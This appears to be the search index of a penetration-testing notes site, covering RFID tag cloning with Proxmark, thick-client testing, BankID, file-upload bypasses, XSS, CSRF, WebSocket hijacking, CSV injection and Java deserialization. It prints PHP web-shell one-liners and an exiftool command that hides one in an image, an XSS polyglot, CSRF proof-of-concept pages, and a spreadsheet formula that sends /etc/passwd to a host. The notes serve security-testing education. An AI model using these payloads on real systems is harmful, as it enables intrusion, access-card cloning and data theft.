frequency chip. You will probably see something like this: EM410x pattern found: EM TAG ID : 00002A3B26 If you have gotten the TAG ID, you can choose to either Emulate it, which tells Proxmark to act like that tag. It will then send out the same pattern as the card itself, and you can get into the door. Or you can simply clone it. With this knowledge you can now use more specific EM410 commands. lf help [...] em { EM4X CHIPs & RFIDs... } [...] proxmark3> lf em help This help 410xread [findone] -- Extract ID from EM410x tag (option 0 for continuous loop, 1 for only 1 tag) 410xdemod [clock] [invert<0|1>] [maxErr] -- Demodulate an EM410x tag from GraphBuffer (args optional) 410xsim <UID> [clock rate] -- Simulate EM410x tag 410xbrute ids.txt [d (delay in ms)] [c (clock rate)] -- Reader bruteforce attack by simulating EM410x tags 410xwatch ['h'] -- Watches for EM410x 125/134 kHz tags (option 'h' for 134) 410xspoof ['h'] --- Watches for EM410x 125/134 kHz tags, and replays them. (option 'h' for 134) 410xwrite <UID> <'0' T5555> <'1' T55x7> [clock rate] -- Write EM410x UID to T5555(Q5) or T55x7 tag, optionally setting clock rate","title":"Identify your card"},{"location":"attacking_rfid_cards/basics_of_rfid_hacking/#clone-the-em410","text":"You need to first read the data of the tag, and then write it somewhere. You can use a T55x7 tag to write it to. I got a T5577 with my proxmark. So just put your T5577 tag on your proxmark, and then run the following command: You take the TAG ID, that was previously identified and you run it like this: proxmark3> lf em4x em410xwrite 00002A3B26 1 Now it should have been written to your tag, and it should work.","title":"Clone the EM410"},{"location":"attacking_thick_client/attacking_thick_client/","text":"Setup # Proxy settings # Using the applications own proxy settings (if available) A good first step is to check if the application itself supports proxy. If it does, and it communicates over HTTPS you can proxy the traffic to burp. Remeber that if the application is running over HTTPS you need to install your burp root certificate if you want to be able to intercept the traffic. If the application does not provide their own proxy settings you can set them in the OS. On windows you do this by searching for \"Proxy settings\" in the search bar. Then you click on \"Lan manager\" or something like that. There you can define your port and ip. Using TCP-dump If it is not possible to to set the OS proxy you can use tcpdump, and dump the traffic to a pcap file, and then load it up in burp. In order to load it up in burp you need need the Burp extender \"Pcap importer\", remember that you can only use this for HTTP traffic, and not HTTPS traffic. Decompile the executable # If the application is built in .Net you can use the program ILSpy to decompile it, to read the source-code. Things to test # http/https SQL-authentication? SQL injection? Authentication Recon # Is the application three-tier (client-server-database) or two tier (client-database)? Language used Check if the application is proxy-aware or not. Note that an application might be proxy aware for most parts, but not all parts. So run all traffic through an invisible proxy. Follow these instructions: https://docs.mitmproxy.org/stable/howto-transparent-vms/ Network communication # Sniff traffic while using the application Use Wireshark and Sysinternals TCPView. Identify protocols used by the application - is there anything more than just http? Check if anything is transfer unencrypted Check that the applications updating method is run over HTTPS Check that the updating process is actually validating the server certificate. Client side # Check for sensitive information # Check for sensitive information contained in the application. It might be API keys, username/password, connection strings. USe procmon to see which files are being used by the application. Check the configuration files for sensitive data Check the registry for sensitive data Use regshot maybe. Check the source code for sensitive information. It might be hardcoded passwords or things like that. Check for database credentials in memory. It is common tha two-tier applications store database credentials in memory. (Check memory)[https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-3/#article] Data storage # Is data cached or stored on the computer? Making it available to unauthenticated users with access to the computer? Local privileged escalation # Check for DLL hijacking privilege escalation Access control # Check that access control is performed on the backend side and not only on the front-end. Injection # CSV - is it possible to import a CSV file? Server side attacks # All the standard OWASP stuff. XML, injections, access control etc. Misc # If all actions in the system are logged, can those logs be manipulated? For example simply by reconfiguring the clock of the computer? Check if sensitive information is put in logs on the computer. Information that might be of interest to another user on the computer that has not authenticated to the application. Check for hidden functionality - this might be found in the code for example. Has the application been compiled with security mechanisms such as DEP and ASLR? Source References: # https://www.cyberark.com/resources/threat-research-blog/thick-client-penetration-testing-methodology","title":"Attacking Thick Client"},{"location":"attacking_thick_client/attacking_thick_client/#setup","text":"","title":"Setup"},{"location":"attacking_thick_client/attacking_thick_client/#proxy-settings","text":"Using the applications own proxy settings (if available) A good first step is to check if the application itself supports proxy. If it does, and it communicates over HTTPS you can proxy the traffic to burp. Remeber that if the application is running over HTTPS you need to install your burp root certificate if you want to be able to intercept the traffic. If the application does not provide their own proxy settings you can set them in the OS. On windows you do this by searching for \"Proxy settings\" in the search bar. Then you click on \"Lan manager\" or something like that. There you can define your port and ip. Using TCP-dump If it is not possible to to set the OS proxy you can use tcpdump, and dump the traffic to a pcap file, and then load it up in burp. In order to load it up in burp you need need the Burp extender \"Pcap importer\", remember that you can only use this for HTTP traffic, and not HTTPS traffic.","title":"Proxy settings"},{"location":"attacking_thick_client/attacking_thick_client/#decompile-the-executable","text":"If the application is built in .Net you can use the program ILSpy to decompile it, to read the source-code.","title":"Decompile the executable"},{"location":"attacking_thick_client/attacking_thick_client/#things-to-test","text":"http/https SQL-authentication? SQL injection? Authentication","title":"Things to test"},{"location":"attacking_thick_client/attacking_thick_client/#recon","text":"Is the application three-tier (client-server-database) or two tier (client-database)? Language used Check if the application is proxy-aware or not. Note that an application might be proxy aware for most parts, but not all parts. So run all traffic through an invisible proxy. Follow these instructions: https://docs.mitmproxy.org/stable/howto-transparent-vms/","title":"Recon"},{"location":"attacking_thick_client/attacking_thick_client/#network-communication","text":"Sniff traffic while using the application Use Wireshark and Sysinternals TCPView. Identify protocols used by the application - is there anything more than just http? Check if anything is transfer unencrypted Check that the applications updating method is run over HTTPS Check that the updating process is actually validating the server certificate.","title":"Network communication"},{"location":"attacking_thick_client/attacking_thick_client/#client-side","text":"","title":"Client side"},{"location":"attacking_thick_client/attacking_thick_client/#check-for-sensitive-information","text":"Check for sensitive information contained in the application. It might be API keys, username/password, connection strings. USe procmon to see which files are being used by the application. Check the configuration files for sensitive data Check the registry for sensitive data Use regshot maybe. Check the source code for sensitive information. It might be hardcoded passwords or things like that. Check for database credentials in memory. It is common tha two-tier applications store database credentials in memory. (Check memory)[https://resources.infosecinstitute.com/damn-vulnerable-thick-client-app-part-3/#article]","title":"Check for sensitive information"},{"location":"attacking_thick_client/attacking_thick_client/#data-storage","text":"Is data cached or stored on the computer? Making it available to unauthenticated users with access to the computer?","title":"Data storage"},{"location":"attacking_thick_client/attacking_thick_client/#local-privileged-escalation","text":"Check for DLL hijacking privilege escalation","title":"Local privileged escalation"},{"location":"attacking_thick_client/attacking_thick_client/#access-control","text":"Check that access control is performed on the backend side and not only on the front-end.","title":"Access control"},{"location":"attacking_thick_client/attacking_thick_client/#injection","text":"CSV - is it possible to import a CSV file?","title":"Injection"},{"location":"attacking_thick_client/attacking_thick_client/#server-side-attacks","text":"All the standard OWASP stuff. XML, injections, access control etc.","title":"Server side attacks"},{"location":"attacking_thick_client/attacking_thick_client/#misc","text":"If all actions in the system are logged, can those logs be manipulated? For example simply by reconfiguring the clock of the computer? Check if sensitive information is put in logs on the computer. Information that might be of interest to another user on the computer that has not authenticated to the application. Check for hidden functionality - this might be found in the code for example. Has the application been compiled with security mechanisms such as DEP and ASLR? Source","title":"Misc"},{"location":"attacking_thick_client/attacking_thick_client/#references","text":"https://www.cyberark.com/resources/threat-research-blog/thick-client-penetration-testing-methodology","title":"References:"},{"location":"attacking_web_applications/bankid_attacks/","text":"Verify text when signing # When the user signs an action/object make sure that the user is not able to edit the text that pop ups in the BankdID signing view. If the user can edit that one user could edit it and more easily trick another user into signing something. Log in as one user and sign as another # Check that you can't log in as one user and then sign the result as another user. If this is in fact an issue depends on the application, how it is suppose to work. DOS by queued upp auth requests # It is always possible to perform a DOS against a user, simply sending new authentication requests to that user. That is not a vulnerability, it is just how BankID works. But there exists a scenario where youi perform multiple authentication-requests, and these are then queued up, so when the user dismissed a auth request the enxt one in the queued pops up. If multiple requests are made, the previous ones should be invalidated. Session fixation # Session fixation might be possible even with BankID. Sometimes you get a cookie when you enter a page, and when you have then authenticated the same cookie is used to retrieve a new cookie. Test with user that has not been provided by customer # If you are provided with a number of users that are meant to have access to the page, test what happens if you authenticate with another user. This might be normal usage, that anyone can log in, and if that is the case then there is nothing to test. But if only limited number of users should be able to autehnticate, test with another user. If it is test-bankdID just generated a new bankid for random user. Check if object can be changed after signing # If you sign objects of some kind, check that you can't change the object aftr the signature.","title":"BankID Attacks"},{"location":"attacking_web_applications/bankid_attacks/#verify-text-when-signing","text":"When the user signs an action/object make sure that the user is not able to edit the text that pop ups in the BankdID signing view. If the user can edit that one user could edit it and more easily trick another user into signing something.","title":"Verify text when signing"},{"location":"attacking_web_applications/bankid_attacks/#log-in-as-one-user-and-sign-as-another","text":"Check that you can't log in as one user and then sign the result as another user. If this is in fact an issue depends on the application, how it is suppose to work.","title":"Log in as one user and sign as another"},{"location":"attacking_web_applications/bankid_attacks/#dos-by-queued-upp-auth-requests","text":"It is always possible to perform a DOS against a user, simply sending new authentication requests to that user. That is not a vulnerability, it is just how BankID works. But there exists a scenario where youi perform multiple authentication-requests, and these are then queued up, so when the user dismissed a auth request the enxt one in the queued pops up. If multiple requests are made, the previous ones should be invalidated.","title":"DOS by queued upp auth requests"},{"location":"attacking_web_applications/bankid_attacks/#session-fixation","text":"Session fixation might be possible even with BankID. Sometimes you get a cookie when you enter a page, and when you have then authenticated the same cookie is used to retrieve a new cookie.","title":"Session fixation"},{"location":"attacking_web_applications/bankid_attacks/#test-with-user-that-has-not-been-provided-by-customer","text":"If you are provided with a number of users that are meant to have access to the page, test what happens if you authenticate with another user. This might be normal usage, that anyone can log in, and if that is the case then there is nothing to test. But if only limited number of users should be able to autehnticate, test with another user. If it is test-bankdID just generated a new bankid for random user.","title":"Test with user that has not been provided by customer"},{"location":"attacking_web_applications/bankid_attacks/#check-if-object-can-be-changed-after-signing","text":"If you sign objects of some kind, check that you can't change the object aftr the signature.","title":"Check if object can be changed after signing"},{"location":"attacking_web_applications/bypass_image_upload/","text":"Bypass File Upload Filtering # One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass. Rename it # We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php. php phtml, .php, .php3, .php4, .php5, and .inc asp asp, .aspx perl .pl, .pm, .cgi, .lib jsp .jsp, .jspx, .jsw, .jsv, and .jspf Coldfusion .cfm, .cfml, .cfc, .dbm GIF89a; # If they check the content. Basically you just add the text \"GIF89a;\" before you shell-code. So it would look something like this: GIF89a; <? system($_GET['cmd']);//or you can insert your complete shell code ?> In image # exiftool -Comment='<?php echo \"<pre>\"; system($_GET['cmd']); ?>' lo.jpg Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file mv lo.jpg lo.php.jpg Nullbyte # References # http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html https://www.owasp.org/index.php/Unrestricted_File_Upload http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Webshells%20In%20PHP,%20ASP,%20JSP,%20Perl,%20And%20ColdFusion.pdf","title":"Bypassing File Upload"},{"location":"attacking_web_applications/bypass_image_upload/#bypass-file-upload-filtering","text":"One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.","title":"Bypass File Upload Filtering"},{"location":"attacking_web_applications/bypass_image_upload/#rename-it","text":"We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php. php phtml, .php, .php3, .php4, .php5, and .inc asp asp, .aspx perl .pl, .pm, .cgi, .lib jsp .jsp, .jspx, .jsw, .jsv, and .jspf Coldfusion .cfm, .cfml, .cfc, .dbm","title":"Rename it"},{"location":"attacking_web_applications/bypass_image_upload/#gif89a","text":"If they check the content. Basically you just add the text \"GIF89a;\" before you shell-code. So it would look something like this: GIF89a; <? system($_GET['cmd']);//or you can insert your complete shell code ?>","title":"GIF89a;"},{"location":"attacking_web_applications/bypass_image_upload/#in-image","text":"exiftool -Comment='<?php echo \"<pre>\"; system($_GET['cmd']); ?>' lo.jpg Exiftool is a great tool to view and manipulate exif-data. Then I had to rename the file mv lo.jpg lo.php.jpg","title":"In image"},{"location":"attacking_web_applications/bypass_image_upload/#nullbyte","text":"","title":"Nullbyte"},{"location":"attacking_web_applications/bypass_image_upload/#references","text":"http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html https://www.owasp.org/index.php/Unrestricted_File_Upload http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Webshells%20In%20PHP,%20ASP,%20JSP,%20Perl,%20And%20ColdFusion.pdf","title":"References"},{"location":"attacking_web_applications/cache_poisoning/","text":"References # https://portswigger.net/blog/practical-web-cache-poisoning https://www.linkedin.com/pulse/host-header-injection-depth-utkarsh-tiwari/ Via host-header #","title":"Cache Poisoning"},{"location":"attacking_web_applications/cache_poisoning/#references","text":"https://portswigger.net/blog/practical-web-cache-poisoning https://www.linkedin.com/pulse/host-header-injection-depth-utkarsh-tiwari/","title":"References"},{"location":"attacking_web_applications/cache_poisoning/#via-host-header","text":"","title":"Via host-header"},{"location":"attacking_web_applications/cross-site-scripting/","text":"Cross-site-scripting # Cross-site-scripting, or XSS as it is sometimes abbreviated to, is an attack that let's the attacker execute javascript code in the browser of the victim. Finding XSS - Polyglot # jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot So, what's the worst that can happen? # The attacker is probably not that interested in changing the color or font of the website the victim is visiting. Although s/he could do that. The worst that can happen is probably the following: Complete control over the browser The attacker can access plugins. Like password managers. The attacker can trick the user into allowing webcam or audio. Session-hijacking/Cookie theft This is when the attacker steals the cookie that is saved in the browser. Using this cookie the attacker can log in to the service as the victim, and thereby gain access to his/her account. If the victim is an admin that has extended privileges (uploading code, images, or whatever) this could lead to a compromise of the server itself. Keylogger The attacker can execute a keylogging-script that steals everything the user inputs in the website. This could be used to steal sensitive information, like passwords, credit cards information, chatlogs or whatever the user inputs. Phishing The attacker can insert a fake login. Image that you visit a site, and from that site you are able to login using your facebook or google-account. The attacker could spoof that so that when you enter your credentials, they are then sent to the attacker. Types of XSS # Persistent This is when the malicious code originates from the websites database. That means the attacker has managed to insert malicious code into the database. So every time the database serve that data the script will me executed. this is probably the most dangerous XSS, since it does not need to rely on social engineering. Reflected This is an attack where the script originates from the users request. This might seem a bit illogical, why would a user inject malicious code to himself? Well the code can DOM based DOM-based attacks are when something is injected into javascript on the DOM. So, it does not go by the server. Because the code gets executed in the response. Take a search-functionality for example. The users enters a search-parameter that gets sent to the server which might sanitize it or something. In the response the found search-items are sent, but not the search-query. But on the webpage the search query is exposed. \"You searched for X\" is shown. That is because it gets the search parameter from the url-parameter. By using document.location.href for example. Protect yourself # The problem with XSS is that it is a bit hard for the users to protect themselves. If there is a problem witht the website there is not that much the user can do. One can always use noscript to block all javascript code. But that pretty much destroys the whole experience with using the internet. Protect your website # There are mainly two ways to protect against encoding and sanitizing . References: # http://brutelogic.com.br/blog/probing-to-find-xss/ http://excess-xss.com/","title":"Cross-site Scripting"},{"location":"attacking_web_applications/cross-site-scripting/#cross-site-scripting","text":"Cross-site-scripting, or XSS as it is sometimes abbreviated to, is an attack that let's the attacker execute javascript code in the browser of the victim.","title":"Cross-site-scripting"},{"location":"attacking_web_applications/cross-site-scripting/#finding-xss-polyglot","text":"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot","title":"Finding XSS - Polyglot"},{"location":"attacking_web_applications/cross-site-scripting/#so-whats-the-worst-that-can-happen","text":"The attacker is probably not that interested in changing the color or font of the website the victim is visiting. Although s/he could do that. The worst that can happen is probably the following: Complete control over the browser The attacker can access plugins. Like password managers. The attacker can trick the user into allowing webcam or audio. Session-hijacking/Cookie theft This is when the attacker steals the cookie that is saved in the browser. Using this cookie the attacker can log in to the service as the victim, and thereby gain access to his/her account. If the victim is an admin that has extended privileges (uploading code, images, or whatever) this could lead to a compromise of the server itself. Keylogger The attacker can execute a keylogging-script that steals everything the user inputs in the website. This could be used to steal sensitive information, like passwords, credit cards information, chatlogs or whatever the user inputs. Phishing The attacker can insert a fake login. Image that you visit a site, and from that site you are able to login using your facebook or google-account. The attacker could spoof that so that when you enter your credentials, they are then sent to the attacker.","title":"So, what's the worst that can happen?"},{"location":"attacking_web_applications/cross-site-scripting/#types-of-xss","text":"Persistent This is when the malicious code originates from the websites database. That means the attacker has managed to insert malicious code into the database. So every time the database serve that data the script will me executed. this is probably the most dangerous XSS, since it does not need to rely on social engineering. Reflected This is an attack where the script originates from the users request. This might seem a bit illogical, why would a user inject malicious code to himself? Well the code can DOM based DOM-based attacks are when something is injected into javascript on the DOM. So, it does not go by the server. Because the code gets executed in the response. Take a search-functionality for example. The users enters a search-parameter that gets sent to the server which might sanitize it or something. In the response the found search-items are sent, but not the search-query. But on the webpage the search query is exposed. \"You searched for X\" is shown. That is because it gets the search parameter from the url-parameter. By using document.location.href for example.","title":"Types of XSS"},{"location":"attacking_web_applications/cross-site-scripting/#protect-yourself","text":"The problem with XSS is that it is a bit hard for the users to protect themselves. If there is a problem witht the website there is not that much the user can do. One can always use noscript to block all javascript code. But that pretty much destroys the whole experience with using the internet.","title":"Protect yourself"},{"location":"attacking_web_applications/cross-site-scripting/#protect-your-website","text":"There are mainly two ways to protect against encoding and sanitizing .","title":"Protect your website"},{"location":"attacking_web_applications/cross-site-scripting/#references","text":"http://brutelogic.com.br/blog/probing-to-find-xss/ http://excess-xss.com/","title":"References:"},{"location":"attacking_web_applications/cross_site_request_forgery/","text":"Cross Site Request Forgery # Cross site Request Forgery (CSRF) attacks forces the user to perform action the he did not intend to perform. This usually (only?) possible by creating a malicious URL-address that the victim executes in his browser, while he is logged in. What's the worst that can happen? # The attacker can make actions for the user. For example change the email-address, make a purchase, or something like that. So it could be used to change the adress, and reset the password by sending an email. How to perform it? # Investigate how the website works First you need to know how the application works. What the endpoints are. Construct your malicious URL Now you just construct the URL. Either using get or post. GET If you use only GET you can construct the URL like this: http://example.com/api/createUser?name=Jose POST If the requests are sent as POST you need to make the victim run a link that where you control the server. So that you can add the arguments in the body. There is one creat trick for this. It is to use the image-tag. Because the image-tag can be used to automatically retrieve information from other sites. If you have an image on your site but it is referenced to <img style=\"display: none\" src=\"http://example.com/image.jpg\"> CSRF with body type JSON # If the body data need to be in the json-format this can be achived in two ways. New way <html> <title>JSON CSRF POC</title> <body> <center> <h1> JSON CSRF POC </h1> <script> fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{\"name\":\"attacker\",\"email\":\"attacker.com\"}'}); </script> <form action=\"#\"> <input type=\"button\" value=\"Submit\" /> </form> </center> </body> </html> Old way <html> <title>JSON CSRF POC</title> <center> <h1> JSON CSRF POC </h1> <form action=http://vul-app.com method=post enctype=\"text/plain\" > <input name='{\"name\":\"attacker\",\"email\":\"attacker@gmail.com\",\"ignore_me\":\"' value='test\"}'type='hidden'> <input type=submit value=\"Submit\"> </form> </center> </html> CSRF - Bypassing content-type application/json # It might be that the server is checking the content-type of the request, and rejects it if it is not application/json . In a form-request it is not possible to set the content-type to application/json. And if it is a XHR request changing the content-type will make it a non-simple request, resulting in a pre-flight request. If a user has flash enabled in the browser it is possible to attack the user with CSRF. There are two ways. https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/ Protection # The only real solution is to use unique tokens for each request. References # http://tipstrickshack.blogspot.cl/2012/10/how-to-exploit-csfr-vulnerabilitycsrf.html https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005) https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)","title":"Cross-site Request Forgery"},{"location":"attacking_web_applications/cross_site_request_forgery/#cross-site-request-forgery","text":"Cross site Request Forgery (CSRF) attacks forces the user to perform action the he did not intend to perform. This usually (only?) possible by creating a malicious URL-address that the victim executes in his browser, while he is logged in.","title":"Cross Site Request Forgery"},{"location":"attacking_web_applications/cross_site_request_forgery/#whats-the-worst-that-can-happen","text":"The attacker can make actions for the user. For example change the email-address, make a purchase, or something like that. So it could be used to change the adress, and reset the password by sending an email.","title":"What's the worst that can happen?"},{"location":"attacking_web_applications/cross_site_request_forgery/#how-to-perform-it","text":"Investigate how the website works First you need to know how the application works. What the endpoints are. Construct your malicious URL Now you just construct the URL. Either using get or post. GET If you use only GET you can construct the URL like this: http://example.com/api/createUser?name=Jose POST If the requests are sent as POST you need to make the victim run a link that where you control the server. So that you can add the arguments in the body. There is one creat trick for this. It is to use the image-tag. Because the image-tag can be used to automatically retrieve information from other sites. If you have an image on your site but it is referenced to <img style=\"display: none\" src=\"http://example.com/image.jpg\">","title":"How to perform it?"},{"location":"attacking_web_applications/cross_site_request_forgery/#csrf-with-body-type-json","text":"If the body data need to be in the json-format this can be achived in two ways. New way <html> <title>JSON CSRF POC</title> <body> <center> <h1> JSON CSRF POC </h1> <script> fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{\"name\":\"attacker\",\"email\":\"attacker.com\"}'}); </script> <form action=\"#\"> <input type=\"button\" value=\"Submit\" /> </form> </center> </body> </html> Old way <html> <title>JSON CSRF POC</title> <center> <h1> JSON CSRF POC </h1> <form action=http://vul-app.com method=post enctype=\"text/plain\" > <input name='{\"name\":\"attacker\",\"email\":\"attacker@gmail.com\",\"ignore_me\":\"' value='test\"}'type='hidden'> <input type=submit value=\"Submit\"> </form> </center> </html>","title":"CSRF with body type JSON"},{"location":"attacking_web_applications/cross_site_request_forgery/#csrf-bypassing-content-type-applicationjson","text":"It might be that the server is checking the content-type of the request, and rejects it if it is not application/json . In a form-request it is not possible to set the content-type to application/json. And if it is a XHR request changing the content-type will make it a non-simple request, resulting in a pre-flight request. If a user has flash enabled in the browser it is possible to attack the user with CSRF. There are two ways. https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/","title":"CSRF - Bypassing content-type application/json"},{"location":"attacking_web_applications/cross_site_request_forgery/#protection","text":"The only real solution is to use unique tokens for each request.","title":"Protection"},{"location":"attacking_web_applications/cross_site_request_forgery/#references","text":"http://tipstrickshack.blogspot.cl/2012/10/how-to-exploit-csfr-vulnerabilitycsrf.html https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005) https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)","title":"References"},{"location":"attacking_web_applications/cross_site_web_socket_hijack/","text":"The attack is kind of like a CSRF but with websockets, and you can always read the returning data. If you can change state over websockets then you can also perform CSRF attacks. How to test for it # The client make a request with the header: Upgrade: websocket Now try to redo the request, but with another origin. If that works then you will be able to perform the attack. The authentication method has to be with a cookie. So that the browser automatically sends the cookie. But remember that it is only an issue if you can perform state changing actions or leak secret data. Change the wsUri in the javascript below. Enter the socket address of your choice. If you want to send some specific strings, change the doSend() parameter. <html> <meta charset=\"utf-8\" /> <title>WebSocket Test</title> <script language=\"javascript\" type=\"text/javascript\"> var wsUri = \"wss://socketaddresshere\"; var output; function init() { output = document.getElementById(\"output\"); testWebSocket(); } function testWebSocket() { websocket = new WebSocket(wsUri); websocket.onopen = function(evt) { onOpen(evt) }; websocket.onclose = function(evt) { onClose(evt) }; websocket.onmessage = function(evt) { onMessage(evt) }; websocket.onerror = function(evt) { onError(evt) }; } function onOpen(evt) { writeToScreen(\"CONNECTED\"); doSend(\"WebSocket rocks\"); } function onClose(evt) { writeToScreen(\"DISCONNECTED\"); } function onMessage(evt) { writeToScreen('<span style=\"color: blue;\">RESPONSE: ' + evt.data+'</span>'); // websocket.close(); } function onError(evt) { writeToScreen('<span style=\"color: red;\">ERROR:</span> ' + evt.data); } function doSend(message) { writeToScreen(\"SENT: \" + message); websocket.send(message); } function writeToScreen(message) { var pre = document.createElement(\"p\"); pre.style.wordWrap = \"break-word\"; pre.innerHTML = message; output.appendChild(pre); } window.addEventListener(\"load\", init, false); </script> <body> <h2>WebSocket Test</h2> <div id=\"output\"></div> </body> </html> How to mitigate it # References # https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html","title":"Cross-Site Web Socket Hijack (CSHSH)"},{"location":"attacking_web_applications/cross_site_web_socket_hijack/#how-to-test-for-it","text":"The client make a request with the header: Upgrade: websocket Now try to redo the request, but with another origin. If that works then you will be able to perform the attack. The authentication method has to be with a cookie. So that the browser automatically sends the cookie. But remember that it is only an issue if you can perform state changing actions or leak secret data. Change the wsUri in the javascript below. Enter the socket address of your choice. If you want to send some specific strings, change the doSend() parameter. <html> <meta charset=\"utf-8\" /> <title>WebSocket Test</title> <script language=\"javascript\" type=\"text/javascript\"> var wsUri = \"wss://socketaddresshere\"; var output; function init() { output = document.getElementById(\"output\"); testWebSocket(); } function testWebSocket() { websocket = new WebSocket(wsUri); websocket.onopen = function(evt) { onOpen(evt) }; websocket.onclose = function(evt) { onClose(evt) }; websocket.onmessage = function(evt) { onMessage(evt) }; websocket.onerror = function(evt) { onError(evt) }; } function onOpen(evt) { writeToScreen(\"CONNECTED\"); doSend(\"WebSocket rocks\"); } function onClose(evt) { writeToScreen(\"DISCONNECTED\"); } function onMessage(evt) { writeToScreen('<span style=\"color: blue;\">RESPONSE: ' + evt.data+'</span>'); // websocket.close(); } function onError(evt) { writeToScreen('<span style=\"color: red;\">ERROR:</span> ' + evt.data); } function doSend(message) { writeToScreen(\"SENT: \" + message); websocket.send(message); } function writeToScreen(message) { var pre = document.createElement(\"p\"); pre.style.wordWrap = \"break-word\"; pre.innerHTML = message; output.appendChild(pre); } window.addEventListener(\"load\", init, false); </script> <body> <h2>WebSocket Test</h2> <div id=\"output\"></div> </body> </html>","title":"How to test for it"},{"location":"attacking_web_applications/cross_site_web_socket_hijack/#how-to-mitigate-it","text":"","title":"How to mitigate it"},{"location":"attacking_web_applications/cross_site_web_socket_hijack/#references","text":"https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html","title":"References"},{"location":"attacking_web_applications/csv_injection/","text":"Payloads # Libreoffice / Linux # In order to make a simple request through libreoffice Calc you can do this in a cell: =WEBSERVICE(\"http://labburk.se\") To get this to execute on Libreoffice > 6 is quite a hassle. First the user mst open the document and allow importing passwd file. Then the user must =WEBSERVICE(CONCATENATE(\"http://localhost:8888/?AA\", ('file:///etc/passwd'#$passwd.A1))) Documented here: https://www.notsosecure.com/data-exfiltration-formula-injection/ You can Office #","title":"CSV Injection"},{"location":"attacking_web_applications/csv_injection/#payloads","text":"","title":"Payloads"},{"location":"attacking_web_applications/csv_injection/#libreoffice-linux","text":"In order to make a simple request through libreoffice Calc you can do this in a cell: =WEBSERVICE(\"http://labburk.se\") To get this to execute on Libreoffice > 6 is quite a hassle. First the user mst open the document and allow importing passwd file. Then the user must =WEBSERVICE(CONCATENATE(\"http://localhost:8888/?AA\", ('file:///etc/passwd'#$passwd.A1))) Documented here: https://www.notsosecure.com/data-exfiltration-formula-injection/ You can","title":"Libreoffice / Linux"},{"location":"attacking_web_applications/csv_injection/#office","text":"","title":"Office"},{"location":"attacking_web_applications/deserialization_attacks/","text":"Serialization (aka marshaling) = process of converting programming object to string. Deserialization (aka marshaling) = process of converting string to programming object Serialization is supported is many programming languages, like Java, Python, Ruby, Php. Burp Suite is looking for deserialized objects in its passive scan (you can see this if you go to scanning ooptions and look for \"serialized objects in HTTP message\". Exactly how it does this is unclear. I have seen it identify a PHP serialized object. Serialization is often times done in order to be able to send the object, over the network, for example. Or so that it can be stored. Both JSON and XML are example of serialized data. Java deserialization attacks # Anything can be serialized, it doesn't have to be an object. It can be a string, boolean, function, etc. The difficuly of exploiting deserialization bugs is that you can never introduce code. You will only be able to control the properties of already existing objects. That is why it is called POP-gadget, property-oriented-programming. This difficuly is in part overcome due to the fact that many applications load in libraries where useful classes exist. That is what ysoserial does. It just creates payloads that can be used if a specific library exists, and then you just test all of them. It is kind of a shot gun approach. So, unles you have access to the source code your best bet is probably to just use the shotgun approach and send in all ysoserial payloads, and hope that the application has included one of ysoserial third-party libraries. However, it should be noted that testing all payloads might lead to an unhandled exception and the application might crash. So there is always that risk involved. The ysoserial payloads are blind payloads, and not command output is returned. Identify # WIth the source code / white-box # In source code: You can check the source code to find out if a vulnerable library is being used. The functions to serialize or unserialize in Java is Here is an example, where we serialize the string \"name\", and write the output to a file called file.bin. The function that actually serialize the object is out.writeObject(name) import java.io.*; public class Serial { public static void main(String[] args) { String name = \"Nytro\"; String filename = \"file.bin\"; try { FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); // Serialization of the \"name\" (String) object // Will be written to \"file.bin\" out.writeObject(name); //Here is the serialization. The serialized object is written to the file file.bin out.close(); file.close(); } catch(Exception e) { System.out.println(\"Exception: \" + e.toString()); } } } The result of the code is that the object is written to a file, if we look at the content of that file it shows us the following: AC ED 00 05 74 00 05 4e 79 74 72 6f ....t..Nytro This is just like a a PHP serilaized object, but the \"syntaxt\" to read it is a bit more difficult, because it is binary and not only ASCII as in PHP. Data starts with the binary \"AC ED\" - this is the \"magic number\" that identifies serialized data, so all serialized data will start with this value Serialization protocol version \"00 05\" We only have a String identified by \"74\" Followed by the length of the string \"00 05\" And, finally, our string For more documentation on the protocol on serialized objects see: 